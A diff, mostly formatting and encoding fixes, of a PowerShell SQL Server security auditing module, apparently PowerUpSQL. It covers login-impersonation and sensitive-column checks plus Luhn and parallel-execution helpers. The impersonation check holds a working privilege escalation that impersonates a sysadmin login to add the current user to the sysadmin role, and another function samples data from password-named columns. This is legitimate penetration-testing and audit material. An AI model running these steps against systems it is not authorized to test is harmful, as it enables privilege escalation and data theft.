             Description   : The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.
-            Remediation   : Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON 
+            Remediation   : Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON
             Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]
             Severity      : High
             IsVulnerable  : Yes
@@ -12244,12 +12268,12 @@ Function Invoke-SQLAuditPrivImpersonateLogin
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
@@ -12257,25 +12281,25 @@ Function Invoke-SQLAuditPrivImpersonateLogin
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,       
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
         HelpMessage = "Don't output anything.")]
         [string]$NoOutput,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Exploit vulnerable issues.')]
         [switch]$Exploit
     )
 
     Begin
-    {                
+    {
         # Table for output
-        $TblData = New-Object -TypeName System.Data.DataTable 
+        $TblData = New-Object -TypeName System.Data.DataTable
         $null = $TblData.Columns.Add('ComputerName')
         $null = $TblData.Columns.Add('Instance')
         $null = $TblData.Columns.Add('Vulnerability')
@@ -12286,13 +12310,13 @@ Function Invoke-SQLAuditPrivImpersonateLogin
         $null = $TblData.Columns.Add('IsExploitable')
         $null = $TblData.Columns.Add('Exploited')
         $null = $TblData.Columns.Add('ExploitCmd')
-        $null = $TblData.Columns.Add('Details')    
-        $null = $TblData.Columns.Add('Reference')   
-        $null = $TblData.Columns.Add('Author')   
+        $null = $TblData.Columns.Add('Details')
+        $null = $TblData.Columns.Add('Reference')
+        $null = $TblData.Columns.Add('Author')
     }
 
     Process
-    {   
+    {
         # Parse computer name from the instance
         $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
 
@@ -12303,8 +12327,8 @@ Function Invoke-SQLAuditPrivImpersonateLogin
         }
 
         # Status user
-        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"  
-   
+        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"
+
         # Test connection to server
         $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
             $_.Status -eq 'Accessible'
@@ -12313,7 +12337,7 @@ Function Invoke-SQLAuditPrivImpersonateLogin
         {
             # Status user
             Write-Verbose -Message "$Instance : CONNECTION FAILED."
-            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"         
+            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"
             Return
         }
         else
@@ -12325,9 +12349,9 @@ Function Invoke-SQLAuditPrivImpersonateLogin
         $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
         $CurrentLogin = $ServerInfo.CurrentLogin
 
-        # ---------------------------------------------------------------      
+        # ---------------------------------------------------------------
         # Set function meta data for report output
-        # ---------------------------------------------------------------   
+        # ---------------------------------------------------------------
         if($Exploit)
         {
             $TestMode  = 'Exploit'
@@ -12335,48 +12359,48 @@ Function Invoke-SQLAuditPrivImpersonateLogin
         else
         {
             $TestMode  = 'Audit'
-        }         
+        }
         $Vulnerability = 'Excessive Privilege - Impersonate Login'
         $Description   = 'The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.'
         $Remediation   = 'Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]'
         $Severity      = 'High'
         $IsVulnerable  = 'No'
-        $IsExploitable = 'No' 
-        $Exploited     = 'No'     
+        $IsExploitable = 'No'
+        $Exploited     = 'No'
         $ExploitCmd    = "Invoke-SQLAuditPrivImpersonateLogin -Instance $Instance -Exploit"
-        $Details       = ''   
-        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms181362.aspx'       
-        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'        
+        $Details       = ''
+        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms181362.aspx'
+        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'
 
-        # ---------------------------------------------------------------     
+        # ---------------------------------------------------------------
         # Check for Vulnerability
-        # ---------------------------------------------------------------       
-       
+        # ---------------------------------------------------------------
+
         # Get list of SQL Server logins that can be impersonated by the current login
         $ImpersonationList = Get-SQLServerPriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
             $_.PermissionName -like 'IMPERSONATE'
-        }        
+        }
 
-        # Check if any SQL Server logins can be impersonated       
+        # Check if any SQL Server logins can be impersonated
         if($ImpersonationList)
         {
             # Status user
             Write-Verbose -Message "$Instance : - Logins can be impersonated."
             $IsVulnerable = 'Yes'
 
-            # ---------------------------------------------------------------     
-            # Check if Vulnerability is Exploitable 
-            # --------------------------------------------------------------- 
+            # ---------------------------------------------------------------
+            # Check if Vulnerability is Exploitable
+            # ---------------------------------------------------------------
 
             # Iterate through each affected login and check if they are a sysadmin
             $ImpersonationList |
             ForEach-Object -Process {
                 # Grab grantee and impersonable login
                 $ImpersonatedLogin = $_.ObjectName
-                $GranteeName = $_.GranteeName 
-                
-                # Check if impersonable login is a sysadmin                  
-                $ImpLoginSysadminStatus = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$ImpersonatedLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status                   
+                $GranteeName = $_.GranteeName
+
+                # Check if impersonable login is a sysadmin
+                $ImpLoginSysadminStatus = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$ImpersonatedLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                 If($ImpLoginSysadminStatus -eq 1)
                 {
                     #Status user
@@ -12384,27 +12408,27 @@ Function Invoke-SQLAuditPrivImpersonateLogin
                     $IsExploitable = 'Yes'
                     $Details = "$GranteeName can impersonate the $ImpersonatedLogin SYSADMIN login. This test was ran with the $CurrentLogin login."
 
-                    # ---------------------------------------------------------------     
+                    # ---------------------------------------------------------------
                     # Exploit Vulnerability
-                    # ---------------------------------------------------------------  
+                    # ---------------------------------------------------------------
                     if($Exploit)
                     {
                         # Status user
                         Write-Verbose -Message "$Instance : - EXPLOITING: Starting exploit process..."
 
                         # Check if user is already a sysadmin
-                        $SysadminPreCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status                                            
+                        $SysadminPreCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                         if($SysadminPreCheck -eq 0)
                         {
                             # Status user
                             Write-Verbose -Message "$Instance : - EXPLOITING: Verified that the current user ($CurrentLogin) is NOT a sysadmin."
-                            Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by impersonating $ImpersonatedLogin..."                            
-                            
+                            Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by impersonating $ImpersonatedLogin..."
+
                             # Attempt to add the current login to sysadmins fixed server role
-                            $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXECUTE AS LOGIN = '$ImpersonatedLogin';EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin';Revert" -SuppressVerbose                                              
+                            $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXECUTE AS LOGIN = '$ImpersonatedLogin';EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin';Revert" -SuppressVerbose
 
                             # Verify the login was added successfully
-                            $SysadminPostCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status               
+                            $SysadminPostCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                             if($SysadminPostCheck -eq 1)
                             {
                                 Write-Verbose -Message "$Instance : - EXPLOITING: It was possible to make the current user ($CurrentLogin) a sysadmin!"
@@ -12430,7 +12454,7 @@ Function Invoke-SQLAuditPrivImpersonateLogin
                     $Details = "$GranteeName can impersonate the $ImpersonatedLogin login (not a sysadmin). This test was ran with the $CurrentLogin login."
                     $IsExploitable = 'No'
                 }
-            
+
                 # Add record
                 $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
             }
@@ -12442,12 +12466,12 @@ Function Invoke-SQLAuditPrivImpersonateLogin
         }
 
         # Status user
-        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"    
+        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"
     }
 
     End
-    {   
-        # Return data  
+    {
+        # Return data
         if ( -not $NoOutput)
         {
             Return $TblData
@@ -12460,20 +12484,20 @@ Function Invoke-SQLAuditPrivImpersonateLogin
 # Invoke-SQLAuditSampleDataByColumn
 # ---------------------------------------
 # Author: Scott Sutherland
-Function Invoke-SQLAuditSampleDataByColumn 
+Function Invoke-SQLAuditSampleDataByColumn
 {
     <#
             .SYNOPSIS
-            Check if the current login can access any database columns that contain the word password. Supports column name keyword search and custom data sample size. 
+            Check if the current login can access any database columns that contain the word password. Supports column name keyword search and custom data sample size.
             Note: For cleaner data sample output use the Get-SQLColumnSampleData function.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER NoOutput
             Don't output anything.
             .PARAMETER Exploit
@@ -12504,31 +12528,31 @@ Function Invoke-SQLAuditSampleDataByColumn
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipeline = $true,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,       
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
         HelpMessage = "Don't output anything.")]
         [string]$NoOutput,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Exploit vulnerable issues.')]
         [switch]$Exploit,
@@ -12543,9 +12567,9 @@ Function Invoke-SQLAuditSampleDataByColumn
     )
 
     Begin
-    {                         
-        # Table for output               
-        $TblData = New-Object -TypeName System.Data.DataTable 
+    {
+        # Table for output
+        $TblData = New-Object -TypeName System.Data.DataTable
         $null = $TblData.Columns.Add('ComputerName')
         $null = $TblData.Columns.Add('Instance')
         $null = $TblData.Columns.Add('Vulnerability')
@@ -12556,13 +12580,13 @@ Function Invoke-SQLAuditSampleDataByColumn
         $null = $TblData.Columns.Add('IsExploitable')
         $null = $TblData.Columns.Add('Exploited')
         $null = $TblData.Columns.Add('ExploitCmd')
-        $null = $TblData.Columns.Add('Details')    
-        $null = $TblData.Columns.Add('Reference')   
-        $null = $TblData.Columns.Add('Author')   
+        $null = $TblData.Columns.Add('Details')
+        $null = $TblData.Columns.Add('Reference')
+        $null = $TblData.Columns.Add('Author')
     }
 
     Process
-    {   
+    {
         # Parse computer name from the instance
         $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
 
@@ -12573,7 +12597,7 @@ Function Invoke-SQLAuditSampleDataByColumn
         }
 
         # Status User
-        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: SEARCH DATA BY COLUMN" 
+        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: SEARCH DATA BY COLUMN"
 
         # Test connection to server
         $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
@@ -12583,7 +12607,7 @@ Function Invoke-SQLAuditSampleDataByColumn
         {
             # Status user
             Write-Verbose -Message "$Instance : CONNECTION FAILED"
-            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: SEARCH DATA BY COLUMN"           
+            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: SEARCH DATA BY COLUMN"
             Return
         }
         else
@@ -12591,9 +12615,9 @@ Function Invoke-SQLAuditSampleDataByColumn
             Write-Verbose -Message "$Instance : CONNECTION SUCCESS"
         }
 
-        # --------------------------------------------     
+        # --------------------------------------------
         # Set function meta data for report output
-        # --------------------------------------------  
+        # --------------------------------------------
         if($Exploit)
         {
             $TestMode  = 'Exploit'
@@ -12601,24 +12625,24 @@ Function Invoke-SQLAuditSampleDataByColumn
         else
         {
             $TestMode  = 'Audit'
-        }      
+        }
         $Vulnerability = 'Potentially Sensitive Columns Found'
         $Description   = 'Columns were found in non default databases that may contain sensitive information.'
         $Remediation   = 'Ensure that all passwords and senstive data are masked, hashed, or encrypted.'
         $Severity      = 'Informational'
         $IsVulnerable  = 'No'
-        $IsExploitable = 'No' 
+        $IsExploitable = 'No'
         $Exploited     = 'No'
         $ExploitCmd    = "Invoke-SQLAuditSampleDataByColumn -Instance $Instance -Exploit"
-        $Details       = ''   
-        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms188348.aspx'       
-        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'         
-        
-        # -----------------------------------------------------------------     
+        $Details       = ''
+        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms188348.aspx'
+        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'
+
+        # -----------------------------------------------------------------
         # Check for the Vulnerability
         # Note: Typically a missing patch or weak configuration
-        # -----------------------------------------------------------------  
-        Write-Verbose -Message "$Instance : - Searching for column names that match criteria..."    
+        # -----------------------------------------------------------------
+        Write-Verbose -Message "$Instance : - Searching for column names that match criteria..."
         $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -ColumnNameSearch $Keyword -NoDefaults -SuppressVerbose
         if($Columns)
         {
@@ -12628,9 +12652,9 @@ Function Invoke-SQLAuditSampleDataByColumn
         {
             $IsVulnerable  = 'No'
         }
-        
-        # -----------------------------------------------------------------     
-        # Check for exploit dependancies 
+
+        # -----------------------------------------------------------------
+        # Check for exploit dependancies
         # Note: Typically secondary configs required for dba/os execution
         # -----------------------------------------------------------------
         if($IsVulnerable -eq 'Yes')
@@ -12648,7 +12672,7 @@ Function Invoke-SQLAuditSampleDataByColumn
 
                 Write-Verbose -Message "$Instance : - Column match: $AffectedColumn"
 
-                # ------------------------------------------------------------------    
+                # ------------------------------------------------------------------
                 # Exploit Vulnerability
                 # Note: Add the current user to sysadmin fixed server role, get data
                 # ------------------------------------------------------------------
@@ -12675,30 +12699,30 @@ Function Invoke-SQLAuditSampleDataByColumn
                         $Exploited = 'Yes'
 
                         # Add record
-                        $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                        
+                        $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                     }
                 }
                 else
                 {
                     # Add affected column list
-                    $Details = "Affected column: $AffectedColumn." 
+                    $Details = "Affected column: $AffectedColumn."
                     $IsExploitable = 'Yes'
-                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)                                                                        
+                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                 }
-            }                             
+            }
         }
         else
         {
             Write-Verbose -Message "$Instance : - No columns were found that matched the search."
-        } 
-                
+        }
+
         # Status User
-        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: SEARCH DATA BY COLUMN" 
+        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: SEARCH DATA BY COLUMN"
     }
 
     End
-    {   
-        # Return data  
+    {
+        # Return data
         if ( -not $NoOutput)
         {
             Return $TblData
@@ -12714,11 +12738,11 @@ Function Invoke-SQLAuditSampleDataByColumn
 #########################################################################
 
 # -------------------------------------------
-# Function: Test-IsLuhnValid 
+# Function: Test-IsLuhnValid
 # -------------------------------------------
-# Author: ÃƒÆ’Ã‹Å“YVIND KALLSTAD
+# Author: ØYVIND KALLSTAD
 # Source: https://communary.net/2016/02/19/the-luhn-algorithm/
-function Test-IsLuhnValid 
+function Test-IsLuhnValid
 {
     <#
             .SYNOPSIS
@@ -12734,7 +12758,7 @@ function Test-IsLuhnValid
             .OUTPUTS
             System.Boolean
             .NOTES
-            Author: ÃƒÆ’Ã‹Å“yvind Kallstad
+            Author: ØYVIND KALLSTAD
             Date: 19.02.2016
             Version: 1.0
             Dependencies: Get-LuhnCheckSum, ConvertTo-Digits
@@ -12755,11 +12779,11 @@ function Test-IsLuhnValid
     $checksum = Get-LuhnCheckSum -Number $numberWithoutChecksumDigit
     $NumCount = ([string]$numberWithoutChecksumDigit).Length
 
-    if ((($checksum + $checksumDigit) % 10) -eq 0 -and $NumCount -ge 12) 
-    {       
+    if ((($checksum + $checksumDigit) % 10) -eq 0 -and $NumCount -ge 12)
+    {
         Write-Output -InputObject $true
     }
-    else 
+    else
     {
         Write-Output -InputObject $false
     }
@@ -12769,9 +12793,9 @@ function Test-IsLuhnValid
 # -------------------------------------------
 # Function: ConvertTo-Digits
 # -------------------------------------------
-# Author: ÃƒÆ’Ã‹Å“YVIND KALLSTAD
+# Author: ØYVIND KALLSTAD
 # Source: https://communary.net/2016/02/19/the-luhn-algorithm/
-function ConvertTo-Digits 
+function ConvertTo-Digits
 {
     <#
             .SYNOPSIS
@@ -12786,7 +12810,7 @@ function ConvertTo-Digits
             https://communary.wordpress.com/
             https://github.com/gravejester/Communary.ToolBox
             .NOTES
-            Author: ÃƒÆ’Ã‹Å“yvind Kallstad
+            Author: ØYVIND KALLSTAD
             Date: 09.05.2015
             Version: 1.0
     #>
@@ -12799,7 +12823,7 @@ function ConvertTo-Digits
     $n = $Number
     $numberOfDigits = 1 + [convert]::ToUInt64([math]::Floor(([math]::Log10($n))))
     $digits = New-Object -TypeName Byte[] -ArgumentList $numberOfDigits
-    for ($i = ($numberOfDigits - 1); $i -ge 0; $i--) 
+    for ($i = ($numberOfDigits - 1); $i -ge 0; $i--)
     {
         $digit = $n % 10
         $digits[$i] = $digit
@@ -12815,7 +12839,7 @@ function ConvertTo-Digits
 # Author: RamblingCookieMonster
 # Source: https://github.com/RamblingCookieMonster/Invoke-Parallel
 # Notes: Added "ImportSessionFunctions" to import custom functions from the current session into the runspace pool.
-function Invoke-Parallel 
+function Invoke-Parallel
 {
     <#
             .SYNOPSIS
@@ -12824,7 +12848,7 @@ function Invoke-Parallel
             .DESCRIPTION
             Function to control parallel processing using runspaces
 
-            Note that each runspace will not have access to variables and commands loaded in your session or in other runspaces by default.  
+            Note that each runspace will not have access to variables and commands loaded in your session or in other runspaces by default.
             This behaviour can be changed with parameters.
 
             .PARAMETER ScriptFile
@@ -12834,7 +12858,7 @@ function Invoke-Parallel
             Scriptblock to run against all computers.
 
             You may use $Using:<Variable> language in PowerShell 3 and later.
-        
+
             The parameter block is added for you, allowing behaviour similar to foreach-object:
             Refer to the input object as $_.
             Refer to the parameter parameter as $parameter
@@ -12844,7 +12868,7 @@ function Invoke-Parallel
 
             .PARAMETER Parameter
             This object is passed to every script block.  You can use it to pass information to the script block; for example, the path to a logging folder
-        
+
             Reference this object as $parameter if using the scriptblock parameterset.
 
             .PARAMETER ImportVariables
@@ -12870,7 +12894,7 @@ function Invoke-Parallel
 
             .PARAMETER MaxQueue
             Maximum number of powershell instances to add to runspace pool.  If this is higher than $throttle, $timeout will be inaccurate
-        
+
             If this is equal or less than throttle, there will be a performance impact
 
             The default value is $throttle times 3, if $runspaceTimeout is not specified
@@ -12926,7 +12950,7 @@ function Invoke-Parallel
             ContentFile = "windows\system32\drivers\etc\hosts"
             Logfile = "C:\temp\log.txt"
             }
-    
+
             $computers | Invoke-Parallel -parameter $stuff {
             $contentFile = join-path "\\$_\c$" $parameter.contentfile
             Get-Content $contentFile |
@@ -12966,7 +12990,7 @@ function Invoke-Parallel
             https://github.com/RamblingCookieMonster/Invoke-Parallel
     #>
     [cmdletbinding(DefaultParameterSetName = 'ScriptBlock')]
-    Param (   
+    Param (
         [Parameter(Mandatory = $false,position = 0,ParameterSetName = 'ScriptBlock')]
         [System.Management.Automation.ScriptBlock]$ScriptBlock,
 
@@ -12977,7 +13001,7 @@ function Invoke-Parallel
         $ScriptFile,
 
         [Parameter(Mandatory = $true,ValueFromPipeline = $true)]
-        [Alias('CN','__Server','IPAddress','Server','ComputerName')]    
+        [Alias('CN','__Server','IPAddress','Server','ComputerName')]
         [PSObject]$InputObject,
 
         [PSObject]$Parameter,
@@ -13005,9 +13029,9 @@ function Invoke-Parallel
 
         [switch] $Quiet = $false
     )
-    
+
     Begin {
-                
+
         #No max queue specified?  Estimate one.
         #We use the script scope to resolve an odd PowerShell 2 issue where MaxQueue isn't seen later in the function
         if( -not $PSBoundParameters.ContainsKey('MaxQueue') )
@@ -13039,7 +13063,7 @@ function Invoke-Parallel
                     #Get variables in this clean runspace
                     #Called last to get vars like $? into session
                     $Variables = Get-Variable | Select-Object -ExpandProperty Name
-                
+
                     #Return a hashtable where we can access each.
                     @{
                         Variables = $Variables
@@ -13047,28 +13071,28 @@ function Invoke-Parallel
                         Snapins   = $Snapins
                     }
             }).invoke()[0]
-            
-            if ($ImportVariables) 
+
+            if ($ImportVariables)
             {
                 #Exclude common parameters, bound parameters, and automatic variables
-                Function _temp 
+                Function _temp
                 {
                     [cmdletbinding()] param()
                 }
                 $VariablesToExclude = @( (Get-Command _temp | Select-Object -ExpandProperty parameters).Keys + $PSBoundParameters.Keys + $StandardUserEnv.Variables )
                 #Write-Verbose "Excluding variables $( ($VariablesToExclude | sort ) -join ", ")"
 
-                # we don't use 'Get-Variable -Exclude', because it uses regexps. 
-                # One of the veriables that we pass is '$?'. 
+                # we don't use 'Get-Variable -Exclude', because it uses regexps.
+                # One of the veriables that we pass is '$?'.
                 # There could be other variables with such problems.
                 # Scope 2 required if we move to a real module
                 $UserVariables = @( Get-Variable | Where-Object -FilterScript {
                         -not ($VariablesToExclude -contains $_.Name)
-                } ) 
+                } )
                 #Write-Verbose "Found variables to import: $( ($UserVariables | Select -expandproperty Name | Sort ) -join ", " | Out-String).`n"
             }
 
-            if ($ImportModules) 
+            if ($ImportModules)
             {
                 $UserModules = @( Get-Module |
                     Where-Object -FilterScript {
@@ -13079,42 +13103,42 @@ function Invoke-Parallel
                     Select-Object -ExpandProperty Name |
                     Where-Object -FilterScript {
                         $StandardUserEnv.Snapins -notcontains $_
-                } ) 
+                } )
             }
         }
 
         #region functions
-            
-        Function Get-RunspaceData 
+
+        Function Get-RunspaceData
         {
             [cmdletbinding()]
             param( [switch]$Wait )
 
             #loop through runspaces
             #if $wait is specified, keep looping until all complete
-            Do 
+            Do
             {
                 #set more to false for tracking completion
                 $more = $false
 
                 #Progress bar if we have inputobject count (bound parameter)
-                if (-not $Quiet) 
+                if (-not $Quiet)
                 {
                     Write-Progress  -Activity 'Running Query' -Status 'Starting threads'`
                     -CurrentOperation "$startedCount threads defined - $totalCount input objects - $script:completedCount input objects processed"`
-                    -PercentComplete $( Try 
+                    -PercentComplete $( Try
                         {
                             $script:completedCount / $totalCount * 100
                         }
-                        Catch 
+                        Catch
                         {
                             0
                         }
                     )
                 }
 
-                #run through each runspace.           
-                Foreach($runspace in $runspaces) 
+                #run through each runspace.
+                Foreach($runspace in $runspaces)
                 {
                     #get the duration - inaccurate
                     $currentdate = Get-Date
@@ -13128,22 +13152,22 @@ function Invoke-Parallel
                     $log.Runtime = "$runMin minutes"
 
                     #If runspace completed, end invoke, dispose, recycle, counter++
-                    If ($runspace.Runspace.isCompleted) 
+                    If ($runspace.Runspace.isCompleted)
                     {
                         $script:completedCount++
-                        
+
                         #check if there were errors
-                        if($runspace.powershell.Streams.Error.Count -gt 0) 
+                        if($runspace.powershell.Streams.Error.Count -gt 0)
                         {
                             #set the logging info and move the file to completed
                             $log.status = 'CompletedWithErrors'
                             #Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
-                            foreach($ErrorRecord in $runspace.powershell.Streams.Error) 
+                            foreach($ErrorRecord in $runspace.powershell.Streams.Error)
                             {
                                 Write-Error -ErrorRecord $ErrorRecord
                             }
                         }
-                        else 
+                        else
                         {
                             #add logging details and cleanup
                             $log.status = 'Completed'
@@ -13158,18 +13182,18 @@ function Invoke-Parallel
                     }
 
                     #If runtime exceeds max, dispose the runspace
-                    ElseIf ( $RunspaceTimeout -ne 0 -and $runtime.totalseconds -gt $RunspaceTimeout) 
+                    ElseIf ( $RunspaceTimeout -ne 0 -and $runtime.totalseconds -gt $RunspaceTimeout)
                     {
                         $script:completedCount++
                         $timedOutTasks = $true
-                            
+
                         #add logging details and cleanup
                         $log.status = 'TimedOut'
                         #Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                         Write-Error -Message "Runspace timed out at $($runtime.totalseconds) seconds for the object:`n$($runspace.object | Out-String)"
 
                         #Depending on how it hangs, we could still get stuck here as dispose calls a synchronous method on the powershell instance
-                        if (!$NoCloseOnTimeout) 
+                        if (!$NoCloseOnTimeout)
                         {
                             $runspace.powershell.dispose()
                         }
@@ -13177,9 +13201,9 @@ function Invoke-Parallel
                         $runspace.powershell = $null
                         $completedCount++
                     }
-                   
-                    #If runspace isn't null set more to true  
-                    ElseIf ($runspace.Runspace -ne $null ) 
+
+                    #If runspace isn't null set more to true
+                    ElseIf ($runspace.Runspace -ne $null )
                     {
                         $log = $null
                         $more = $true
@@ -13212,12 +13236,12 @@ function Invoke-Parallel
                 #Loop again only if -wait parameter and there are more runspaces to process
             }
             while ($more -and $PSBoundParameters['Wait'])
-                
+
             #End of runspace function
         }
 
         #endregion functions
-        
+
         #region Init
 
         if($PSCmdlet.ParameterSetName -eq 'ScriptFile')
@@ -13234,17 +13258,17 @@ function Invoke-Parallel
             }
 
             $UsingVariableData = $null
-                
+
 
             # This code enables $Using support through the AST.
             # This is entirely from  Boe Prox, and his https://github.com/proxb/PoshRSJob module; all credit to Boe!
-                
+
             if($PSVersionTable.PSVersion.Major -gt 2)
             {
                 #Extract using references
                 $UsingVariables = $ScriptBlock.ast.FindAll({
                         $args[0] -is [System.Management.Automation.Language.UsingExpressionAst]
-                },$true)    
+                },$true)
 
                 If ($UsingVariables)
                 {
@@ -13260,9 +13284,9 @@ function Invoke-Parallel
                         $_.Group |
                         Select-Object -First 1
                     }
-        
+
                     #Extract the name, value, and create replacements for each
-                    $UsingVariableData = ForEach ($Var in $UsingVar) 
+                    $UsingVariableData = ForEach ($Var in $UsingVar)
                     {
                         Try
                         {
@@ -13285,7 +13309,7 @@ function Invoke-Parallel
                     $Tuple = [Tuple]::Create($List, $NewParams)
